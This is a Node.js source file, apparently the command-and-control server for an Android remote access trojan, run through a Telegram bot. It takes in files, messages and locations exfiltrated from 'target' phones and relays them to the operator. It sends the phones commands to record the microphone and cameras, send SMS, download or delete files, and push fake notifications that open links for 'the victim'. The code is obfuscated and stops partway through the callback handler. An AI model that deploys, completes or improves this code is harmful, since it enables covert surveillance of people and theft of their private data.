process.env.NTBA_FIX_350 = 1; 
process.env.NTBA_FIX_319 = 1; 

const express = require('express'),
  webSocket = require('ws'),
  http = require('http'),
  telegramBot = require('node-telegram-bot-api'),
  uuid4 = require('uuid'),
  multer = require('multer'),
  bodyParser = require('body-parser'),
  axios = require('axios')
require('dotenv').config()

const token = process.env.TOKEN,
  id = process.env.ID,
  address = 'https://www.google.com',
  app = express(),
  appServer = http.createServer(app),
  appSocket = new webSocket.Server({ server: appServer }),
  appBot = new telegramBot(token, { polling: true }),
  appClients = new Map()

// 🚀 ADVANCED SERVER TIMEOUT FIXES FOR RENDER
appServer.keepAliveTimeout = 120000; // 120 seconds
appServer.headersTimeout = 120000; // 120 seconds

const upload = multer({ limits: { fileSize: 500 * 1024 * 1024 } }); // 500MB
app.use(bodyParser.json({ limit: '500mb' }));
app.use(bodyParser.urlencoded({ limit: '500mb', extended: true }));

let currentUuid = '',
  currentNumber = '',
  currentTitle = ''

app.get('/', function (_0x1b89da, _0x3398a0) {
  _0x3398a0.send(
    '<h1 align="center">\uD835\uDE4E\uD835\uDE5A\uD835\uDE67\uD835\uDE6B\uD835\uDE5A\uD835\uDE67 \uD835\uDE6A\uD835\uDE65\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\uD835\uDE5A\uD835\uDE59 \uD835\uDE68\uD835\uDE6A\uD835\uDE58\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE5B\uD835\uDE6A\uD835\uDE61\uD835\uDE61\uD835\uDE6E</h1>'
  )
})

// ⚡️ FULLY ADVANCED FAULT-TOLERANT UPLOAD ROUTE
app.post('/uploadFile', (req, res) => {
  // Isolate timeout for this specific heavy route
  req.setTimeout(300000); 

  upload.single('file')(req, res, function (err) {
    if (err) {
      console.log('❌ [Upload Error]:', err.message);
      return res.status(500).send('Upload failed');
    }

    if (!req.file) {
      console.log('⚠️ [Warning]: Android Hit Server but No File Received (App aborted or 0 bytes).');
      return res.status(200).send(''); // Still reply 200 so app doesn't crash
    }

    const fileName = req.file.originalname || 'unknown_file';
    console.log(`📥 [Incoming File]: ${fileName} | Size: ${(req.file.size / 1024).toFixed(2)} KB`);

    // Let app know we got it instantly
    res.status(200).send('');

    // Push to Telegram seamlessly
    appBot.sendDocument(
      id,
      req.file.buffer,
      {
        caption:
          '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
          (req.headers.model || 'Unknown Device') +
          '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
        parse_mode: 'HTML',
      },
      {
        filename: fileName,
        contentType: req.file.mimetype || 'application/octet-stream',
      }
    ).then(() => {
        console.log(`✅ [Telegram Success]: Sent ${fileName} to chat.`);
    }).catch(apiErr => {
        console.log('❌ [Telegram API Error]:', apiErr.message);
    });
  });
});

app.post('/uploadText', (_0x5a02f5, _0x55205a) => {
  _0x55205a.send(''); 
  appBot.sendMessage(
    id,
    '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
      (_0x5a02f5.headers.model || 'Unknown') +
      '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\n\n' +
      _0x5a02f5.body.text,
    { parse_mode: 'HTML' }
  ).catch(()=>{});
})

app.post('/uploadLocation', (_0xfc380d, _0x48b391) => {
  _0x48b391.send(''); 
  appBot.sendLocation(id, _0xfc380d.body.lat, _0xfc380d.body.lon).then(() => {
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
        (_0xfc380d.headers.model || 'Unknown') +
        '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
      { parse_mode: 'HTML' }
    );
  }).catch(()=>{});
})

appSocket.on('connection', (_0x466cd0, _0x1cf0ae) => {
  const _0x275c2d = uuid4.v4(),
    _0x2cfd1d = _0x1cf0ae.headers.model || 'Unknown',
    _0x5409ca = _0x1cf0ae.headers.battery || 'Unknown',
    _0x4a1a34 = _0x1cf0ae.headers.version || 'Unknown',
    _0x340b05 = _0x1cf0ae.headers.brightness || 'Unknown',
    _0x1dd883 = _0x1cf0ae.headers.provider || 'Unknown'
  
  _0x466cd0.uuid = _0x275c2d
  appClients.set(_0x275c2d, {
    model: _0x2cfd1d,
    battery: _0x5409ca,
    version: _0x4a1a34,
    brightness: _0x340b05,
    provider: _0x1dd883,
  })
  
  appBot.sendMessage(
    id,
    '\xB0\u2022 NEW DEVICE IS CONNECTED, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n' +
      ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n') +
      ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x5409ca + '</b>\n') +
      ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x4a1a34 + '</b>\n') +
      ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x340b05 + '</b>\n') +
      ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x1dd883 + '</b>'),
    { parse_mode: 'HTML' }
  )
  
  _0x466cd0.on('close', function () {
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE59\uD835\uDE5E\uD835\uDE68\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n' +
        ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n'),
      { parse_mode: 'HTML' }
    )
    appClients.delete(_0x466cd0.uuid)
  })
})

appBot.on('message', (_0x2ca88f) => {
  const _0x32d1ff = _0x2ca88f.chat.id
  if (_0x2ca88f.reply_to_message) {
    if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64 \uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE4E\uD835\uDE48\uD835\uDE4E')) {
      currentNumber = _0x2ca88f.text;
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68 \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\n\n\u2022 ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
        { reply_markup: { force_reply: true } }
      );
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A')) {
      appSocket.clients.forEach(function (_0x465249) {
        if (_0x465249.uuid == currentUuid) _0x465249.send('send_message:' + currentNumber + '/' + _0x2ca88f.text)
      });
      currentNumber = ''; currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61')) {
      appSocket.clients.forEach(function (_0x3a189f) {
        if (_0x3a189f.uuid == currentUuid) _0x3a189f.send('send_message_to_all:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59')) {
      appSocket.clients.forEach(function (_0x1bb0ba) {
        if (_0x1bb0ba.uuid == currentUuid) _0x1bb0ba.send('file:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A')) {
      appSocket.clients.forEach(function (_0x4e86bf) {
        if (_0x4e86bf.uuid == currentUuid) _0x4e86bf.send('delete_file:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A')) {
      appSocket.clients.forEach(function (_0x461ab3) {
        if (_0x461ab3.uuid == currentUuid) _0x461ab3.send('microphone:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56')) {
      appSocket.clients.forEach(function (_0x4f49b1) {
        if (_0x4f49b1.uuid == currentUuid) _0x4f49b1.send('rec_camera_main:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE68\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A')) {
      appSocket.clients.forEach(function (_0x183617) {
        if (_0x183617.uuid == currentUuid) _0x183617.send('rec_camera_selfie:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE64\uD835\uDE63 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69')) {
      appSocket.clients.forEach(function (_0x523d20) {
        if (_0x523d20.uuid == currentUuid) _0x523d20.send('toast:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63')) {
      currentTitle = _0x2ca88f.text;
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59 \uD835\uDE57\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\n\n\u2022 ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
        { reply_markup: { force_reply: true } }
      );
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE57\uD835\uDE5A \uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59 \uD835\uDE57\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63')) {
      appSocket.clients.forEach(function (_0x13f3d9) {
        if (_0x13f3d9.uuid == currentUuid) _0x13f3d9.send('show_notification:' + currentTitle + '/' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64 \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E')) {
      appSocket.clients.forEach(function (_0x3d44ae) {
        if (_0x3d44ae.uuid == currentUuid) _0x3d44ae.send('play_audio:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    }
  }
  
  if (id == _0x32d1ff) {
    if (_0x2ca88f.text == '/start') {
      appBot.sendMessage(
        id,
        '\xB0\u2022 \xB0\u2022 \uD835\uDE52\uD835\uDE5A\uD835\uDE61\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE5A \uD835\uDE69\uD835\uDE64  Fuse\uD835\uDE4D\uD835\uDE56\uD835\uDE69 \uD835\uDE65\uD835\uDE56\uD835\uDE63\uD835\uDE5A\uD835\uDE61\n\n\u2022 ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n\u2022 ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n\u2022 ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n\u2022 ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              ['\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68'],
              ['\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59'],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (_0x2ca88f.text == '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68') {
      if (appClients.size == 0) {
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\n\n\u2022 ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        )
      } else {
        let _0x31005f = '\xB0\u2022 \uD835\uDE47\uD835\uDE5E\uD835\uDE68\uD835\uDE69 \uD835\uDE64\uD835\uDE5B \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 :\n\n'
        appClients.forEach(function (_0x3c015b) {
          _0x31005f += '\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x3c015b.model + '</b>\n' +
            ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x3c015b.battery + '</b>\n') +
            ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x3c015b.version + '</b>\n') +
            ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x3c015b.brightness + '</b>\n') +
            ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x3c015b.provider + '</b>\n\n')
        })
        appBot.sendMessage(id, _0x31005f, { parse_mode: 'HTML' })
      }
    }
    if (_0x2ca88f.text == '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59') {
      if (appClients.size == 0) {
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\n\n\u2022 ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        )
      } else {
        const _0x118a77 = []
        appClients.forEach(function (_0x4ed698, _0x52dcb4) {
          _0x118a77.push([{ text: _0x4ed698.model, callback_data: 'device:' + _0x52dcb4 }])
        })
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE5A\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59',
          { reply_markup: { inline_keyboard: _0x118a77 } }
        )
      }
    }
  } else {
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE4B\uD835\uDE5A\uD835\uDE67\uD835\uDE62\uD835\uDE5E\uD835\uDE68\uD835\uDE68\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE59\uD835\uDE5A\uD835\uDE63\uD835\uDE5E\uD835\uDE5A\uD835\uDE59')
  }
})

appBot.on('callback_query', (_0x425827) => {
  const _0x440ba5 = _0x425827.message,
    _0x9f09ec = _0x425827.data,
    _0x2f3f8b = _0x9f09ec.split(':')[0],
    _0x39894d = _0x9f09ec.split(':')[1]
  
  if (_0x2f3f8b == 'device') {
    appBot.editMessageText(
